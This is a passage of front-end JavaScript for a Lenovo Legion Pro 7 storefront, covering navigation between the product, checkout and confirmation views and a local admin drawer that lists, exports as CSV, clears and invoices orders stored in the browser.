    }

    // Navigation buttons
    const btnContinueShopping = document.getElementById('btnContinueShopping');
    if (btnContinueShopping) {
      btnContinueShopping.onclick = () => {
        window.location.href = '../../';
      };
    }

    const btnBackToProductPage = document.getElementById('btnBackToProductPage');
    if (btnBackToProductPage) {
      btnBackToProductPage.onclick = () => {
        if (orderConfirmationScreen) orderConfirmationScreen.style.display = 'none';
        if (viewCheckout) viewCheckout.style.display = 'none';
        if (viewProductPage) viewProductPage.style.display = 'block';
        window.scrollTo({ top: 0, behavior: 'smooth' });
      };
    }
  }

  // ==========================================================================
  //  VIEW SWITCHING & ADMIN HUB DRAWER
  // ==========================================================================
  function setupViewSwitching() {
    const btnBuyNow = document.getElementById('btnBuyNow');
    const chBackToProduct = document.getElementById('chBackToProduct');
    const viewProductPage = document.getElementById('viewProductPage');
    const viewCheckout = document.getElementById('viewCheckout');
    const checkoutGridArea = document.getElementById('checkoutGridArea');
    const orderConfirmationScreen = document.getElementById('orderConfirmationScreen');

    if (btnBuyNow) {
      btnBuyNow.addEventListener('click', () => {
        if (viewProductPage) viewProductPage.style.display = 'none';
        if (viewCheckout) viewCheckout.style.display = 'block';
        if (checkoutGridArea) checkoutGridArea.style.display = 'grid';
        if (orderConfirmationScreen) orderConfirmationScreen.style.display = 'none';
        syncOrderSummary();
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    }

    if (chBackToProduct) {
      chBackToProduct.addEventListener('click', () => {
        if (viewCheckout) viewCheckout.style.display = 'none';
        if (viewProductPage) viewProductPage.style.display = 'block';
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    }
  }

  function setupAdminDrawer() {
    const footerAdminTrigger = document.getElementById('footerAdminTrigger');
    const navOrdersBtn = document.getElementById('navOrdersBtn');
    const ordersDrawer = document.getElementById('ordersDrawer');
    const drawerBackdrop = document.getElementById('drawerBackdrop');
    const btnCloseDrawer = document.getElementById('btnCloseDrawer');
    const btnExportOrdersCsv = document.getElementById('btnExportOrdersCsv');
    const btnClearAllOrders = document.getElementById('btnClearAllOrders');
    const ordersListContainer = document.getElementById('ordersListContainer');

    function openDrawer() {
      if (ordersDrawer) ordersDrawer.classList.add('open');
      if (drawerBackdrop) drawerBackdrop.classList.add('open');
      renderAdminOrdersList();
    }

    function closeDrawer() {
      if (ordersDrawer) ordersDrawer.classList.remove('open');
      if (drawerBackdrop) drawerBackdrop.classList.remove('open');
    }

    if (footerAdminTrigger) {
      footerAdminTrigger.addEventListener('click', (e) => {
        e.preventDefault();
        openDrawer();
      });
    }

    if (navOrdersBtn) {
      navOrdersBtn.addEventListener('click', (e) => {
        e.preventDefault();
        openDrawer();
      });
    }

    if (btnCloseDrawer) btnCloseDrawer.addEventListener('click', closeDrawer);
    if (drawerBackdrop) drawerBackdrop.addEventListener('click', closeDrawer);

    if (btnClearAllOrders) {
      btnClearAllOrders.addEventListener('click', () => {
        if (confirm('Clear local order records for Lenovo Legion Pro 7?')) {
          localStorage.removeItem(LOCAL_STORAGE_KEY);
          localStorage.removeItem(LOCAL_STORAGE_LEGION_LIST);
          renderAdminOrdersList();
        }
      });
    }

    if (btnExportOrdersCsv) {
      btnExportOrdersCsv.addEventListener('click', () => {
        const orders = getLocalOrders();
        if (!orders.length) {
          alert('No orders found to export.');
          return;
        }

        const headers = ['Order ID', 'Date', 'Customer Name', 'Email', 'Phone', 'Address', 'Item', 'Qty', 'Total', 'Payment Method', 'Status'];
        const rows = orders.map(o => [
          `"${o.orderId || ''}"`,
          `"${o.orderDate || o.dateStr || ''}"`,
          `"${(o.fullName || o.name || '').replace(/"/g, '""')}"`,
          `"${o.email || ''}"`,
          `"${o.phone || ''}"`,
          `"${(o.address || o.deliveryAddress || '').replace(/"/g, '""')}"`,
          `"${(o.item || '').replace(/"/g, '""')}"`,
          o.quantity || o.qty || 1,
          `"${o.price || o.total || ''}"`,
          `"${(o.paymentMethod || o.payMethod || '').replace(/"/g, '""')}"`,
          `"${(o.status || '').replace(/"/g, '""')}"`
        ]);

        const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(e => e.join(','))].join('\n');
        const encodedUri = encodeURI(csvContent);
        const link = document.createElement('a');
        link.setAttribute('href', encodedUri);
        link.setAttribute('download', `lenovo_legion_orders_${new Date().toISOString().slice(0, 10)}.csv`);
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      });
    }

    function renderAdminOrdersList() {
      if (!ordersListContainer) return;
      const orders = getLocalOrders();

      if (!orders.length) {
        ordersListContainer.innerHTML = `
          <div style="padding:24px; text-align:center; color:#888;">
            <p>No customer orders recorded locally yet.</p>
            <p style="font-size:12px; margin-top:6px;">Orders placed through this storefront will appear here automatically.</p>
          </div>
        `;
        return;
      }

      ordersListContainer.innerHTML = orders.map(ord => {
        const isRed = (ord.paymentMethod === 'Redeem Code' || (ord.payMethod && ord.payMethod.includes('Redeem')));
        return `
          <div style="border:1px solid #e7e7e7; border-radius:6px; padding:12px; margin-bottom:12px; background:#fafafa; font-size:12px;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
              <div>
                <strong style="color:#0f1111;">Order #${ord.orderId}</strong> &bull; 
                <span style="color:#007185;">${ord.orderDate || ord.dateStr || ''}</span>
              </div>
              <span style="background:${isRed ? '#007600' : '#e77600'}; color:#fff; padding:3px 8px; border-radius:4px; font-weight:700; font-size:11px;">
                ${ord.paymentMethod || ord.payMethod || 'Order'}
              </span>
            </div>
            <div style="color:#333; line-height:1.5; margin-bottom:8px;">
              <strong>Item:</strong> ${ord.item}<br>
              <strong>Recipient:</strong> ${ord.fullName || ord.name} (${ord.email || 'N/A'}, ${ord.phone || 'N/A'})<br>
              <strong>Address:</strong> ${ord.address || ord.deliveryAddress}<br>
              <strong>Total:</strong> <span style="color:var(--price-red); font-weight:700;">${isRed ? '$0.00 (Redeem Applied)' : (ord.price || formatMoney(ord.total))}</span>
            </div>
            <div style="display:flex; gap:8px;">
              <button class="btn-download-order-pdf" data-order-id="${ord.orderId}" style="background:#ffd814; border:1px solid #fcd200; padding:4px 10px; border-radius:4px; font-weight:700; cursor:pointer; font-size:11px;">
                📥 Download PDF Invoice
              </button>
            </div>
          </div>
        `;
      }).join('');

      ordersListContainer.querySelectorAll('.btn-download-order-pdf').forEach(btn => {
        btn.addEventListener('click', () => {
          const ordId = btn.getAttribute('data-order-id');
          const target = orders.find(o => o.orderId === ordId);
          if (target && typeof window.downloadOrderInvoicePdf === 'function') {
            window.downloadOrderInvoicePdf(target);
          } else if (target && typeof window.generateAmazonInvoicePDF === 'function') {
            window.generateAmazonInvoicePDF(target);
          }
        });
      });
    }
  }

  // ==========================================================================
  //  INITIALIZATION
  // ==========================================================================
  document.addEventListener('DOMContentLoaded', () => {
    updateProductView();
    setupGallery();
    setupOptionSelectors();
    setupCheckoutAccordion();
    setupViewSwitching();
    setupAdminDrawer();
  });
})();
